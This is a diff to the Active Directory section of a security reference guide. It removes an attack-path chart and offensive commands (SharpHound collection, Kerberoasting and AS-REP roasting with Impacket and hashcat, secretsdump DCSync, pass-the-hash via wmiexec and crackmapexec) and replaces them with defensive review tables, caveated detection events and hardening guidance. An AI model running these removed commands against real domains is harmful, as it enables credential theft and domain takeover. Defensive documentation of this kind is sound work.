@@ -2334,89 +2334,61 @@ A long DNS label is not an entropy calculation and does not establish tunneling.
  
 *Full reference: [Tradecraft/active-directory.md](Tradecraft/active-directory.md)*
  
-### Attack Path Overview
+This overview maps common identity attack paths to defensive control points. The stages are illustrative; environments differ, and a single event or tool result does not establish compromise.
  
-```
-Initial Access
-    └──► Local Admin on Workstation
-              └──► Credential Harvest (Mimikatz / LSASS)
-                        ├──► Pass-the-Hash → other workstations
-                        ├──► Kerberoasting → service account hashes → crack offline
-                        └──► BloodHound path → ACL abuse / DA session → Domain Admin
-                                    └──► DCSync → krbtgt hash
-                                              └──► Golden Ticket → persistent DA
-```
- 
-### Key Offensive Tools
- 
-**Enumeration (Windows):**
-```powershell
-# BloodHound / SharpHound - map all attack paths
-.\SharpHound.exe -c All --zipfilename bh_data.zip
-# Upload zip to BloodHound GUI → query shortest path to DA
- 
-# PowerView - manual enumeration
-Get-DomainUser -AdminCount 1                          # admin accounts
-Get-DomainGroupMember "Domain Admins" -Recurse        # DA members
-Find-InterestingDomainAcl -ResolveGUIDs               # misconfigured ACLs
-Find-DomainUserLocation -UserName "DA_User"            # where DA is logged in
+```mermaid
+flowchart LR
+    I[Initial access or<br/>exposed workstation] --> L[Local admin or<br/>credential exposure]
+    L --> C[Reusable credentials,<br/>service account, or session]
+    C --> A[Excessive rights or<br/>unsafe delegation]
+    A --> D[Domain-level privileges]
+    D --> R[Replication and<br/>ticket-signing risk]
+    P1[Privileged access workstations<br/>and separate admin accounts] -. reduce .-> L
+    P2[Managed service accounts,<br/>least privilege, and tiering] -. reduce .-> A
+    P3[Replication-right review,<br/>monitoring, and recovery plan] -. detect / contain .-> R
 ```
  
-**Credential attacks (Linux / Impacket):**
-```bash
-# Kerberoasting
-python3 GetUserSPNs.py corp.local/user:Pass -dc-ip DC01 -request -outputfile hashes.txt
-hashcat -m 13100 hashes.txt rockyou.txt
+### Assessment and Investigation
  
-# AS-REP roasting (no credentials needed)
-python3 GetNPUsers.py corp.local/ -dc-ip DC01 -no-pass -usersfile users.txt -format hashcat
-hashcat -m 18200 asrep.txt rockyou.txt
+Use approved directory and endpoint assessment methods to inventory privileged users, service accounts, delegated access, replication rights, interactive logons, and changes to protected groups. Collection scope matters: directory graph exports and endpoint telemetry can expose sensitive identity relationships. Store them with access controls and a retention period.
  
-# DCSync (requires replication rights)
-python3 secretsdump.py 'corp.local/DA_User:Password@DC01'
- 
-# Pass-the-Hash
-python3 wmiexec.py corp/Administrator@TARGET -hashes :NTLM_HASH
-crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLM_HASH
-```
+| Review area | Defensive questions |
+| --- | --- |
+| Privileged identities | Are administrative accounts separate from daily-use accounts? Which hosts may they sign in to? |
+| Service identities | Are service accounts managed, narrowly scoped, and free of unnecessary interactive logon rights? |
+| Delegation and ACLs | Which principals can change sensitive objects, group membership, service configuration, or replication permissions? |
+| Credential exposure | Are privileged sign-ins isolated from lower-trust devices, and are credential protections supported and monitored? |
+| Recovery | Are domain-controller backups and forest-recovery procedures current and periodically validated? |
  
 ### Key Detection Events
  
-| Event ID | Attack | Sigma Rule |
-|---|---|---|
-| 4769 (RC4 cipher) | Kerberoasting | `TicketEncryptionType == 0x17` + not computer account |
-| 4771 | AS-REP roasting / spray | Pre-auth failures in volume |
-| 4662 (replication GUIDs) | DCSync | `1131f6aa` or `1131f6ab` from non-DC |
-| 4624 LogonType 3 + NTLM | Pass-the-hash | Workstation→workstation NTLM lateral movement |
-| 7045 | PsExec / service install | New service from unexpected process |
-| 5136 | AdminSDHolder modification | Write to `CN=AdminSDHolder` |
+These events are review pivots, not one-to-one attack labels. Validate audit policy, event fields, domain-controller coverage, normal administration, and platform version before using them as detections.
+ 
+| Event or signal | Investigation focus | Caveat |
+| --- | --- | --- |
+| 4769 with RC4 encryption (0x17) | Unusual service-ticket volume, requesting account, target service, and baseline | RC4 use may be legacy or policy-driven; the event alone does not establish Kerberoasting. |
+| 4768 with pre-authentication type 0 | Requests for accounts configured without Kerberos pre-authentication | Confirm account settings and DC audit coverage; do not infer intent from one request. |
+| 4662 with replication rights on a domain naming context | Subject account, source host, granted rights, and whether the source is an approved domain controller | Legitimate directory replication and authorized backup products can produce related activity. |
+| 4624 network logons using NTLM | Source/destination relationship, account, process, and NTLM policy context | NTLM network logons do not prove pass-the-hash; correlate with other host evidence. |
+| 7045 service installation and 5136 directory changes | Initiating process, actor, target object, change window, and approved change record | Both events have legitimate administrative uses; tune to known management systems and sensitive objects. |
  
 ### Hardening Checklist
  
-```powershell
-# Disable WDigest - prevents cleartext creds in LSASS
-Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" `
-    -Name "UseLogonCredential" -Value 0
+Apply identity controls in stages and validate impact for the organization's Windows Server versions, authentication dependencies, and recovery procedures.
  
-# LSASS Protected Process Light - blocks most dumping
-Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -Value 1
+| Control | Defensive use | Rollout consideration |
+| --- | --- | --- |
+| Separate privileged identities and hardened admin workstations | Reduce credential exposure and constrain where high-privilege accounts sign in | Inventory dependencies and emergency access before enforcing tier boundaries. |
+| LSA protection and Credential Guard | Protect eligible credential material and LSASS from unsupported access | Check hardware/OS prerequisites, audit compatibility, and verify deployment state. |
+| Protected Users group | Apply restrictive authentication behavior to eligible privileged users | Test every account and workload first; Microsoft warns that supported authentication changes can interrupt access. |
+| Windows LAPS and managed service accounts | Rotate local administrator passwords and reduce static service-account secrets | Use current supported deployment guidance and restrict who can read managed passwords. |
+| Review delegation, group membership, and replication rights | Remove unnecessary paths to privileged control and domain replication | Record approved exceptions and alert on sensitive changes. |
+| Forest recovery and krbtgt procedures | Recover from domain-level credential compromise | Follow Microsoft's recovery guide; resetting the password twice requires healthy replication and a wait based on configured ticket lifetimes (10 hours is the default minimum interval in the documented default configuration). Do not use an archived script as a substitute for the current runbook. |
  
-# Protected Users group - removes NTLM, DES/RC4, delegation for privileged accounts
-Add-ADGroupMember -Identity "Protected Users" -Members "DA_User1","DA_User2"
+Useful primary references: Microsoft's [Protected Users group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group), [additional LSA protection](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection), and [krbtgt forest-recovery procedure](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-the-krbtgt-password).
  
-# LAPS - randomize local admin passwords
-msiexec /q /i LAPS.x64.msi
-Set-AdmPwdComputerSelfPermission -OrgUnit "OU=Workstations,DC=corp,DC=local"
+**Assessment tools:** [BloodHound](https://github.com/SpecterOps/BloodHound), [PingCastle](https://www.pingcastle.com/), and [Purple Knight](https://www.semperis.com/purple-knight/) can help organize findings. Review each tool's current collection behavior, permissions, data handling, and intended assessment scope before deployment.
  
-# Rotate krbtgt (invalidates golden tickets)
-# https://github.com/microsoftarchive/New-KrbtgtKeys.ps1
-# Must rotate TWICE, 10 hours apart
-```
- 
-**AD Assessment tools:**
-- [BloodHound](https://github.com/SpecterOps/BloodHound) - attack path mapping
-- [Pingcastle](https://www.pingcastle.com/) - free AD health/risk score
-- [Purple Knight](https://www.semperis.com/purple-knight/) - free AD security assessment
 [Return to Table of Contents](#table-of-contents---enhanced-edition)
  
 ---
